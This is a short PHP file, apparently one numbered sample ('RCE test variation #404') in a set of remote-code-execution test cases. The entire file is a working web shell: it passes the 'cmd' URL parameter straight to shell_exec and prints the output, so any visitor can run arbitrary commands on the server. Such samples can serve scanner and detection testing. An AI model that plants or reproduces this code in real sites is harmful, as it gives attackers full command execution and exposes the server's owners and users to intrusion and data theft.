<?php
// RCE test variation #404
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>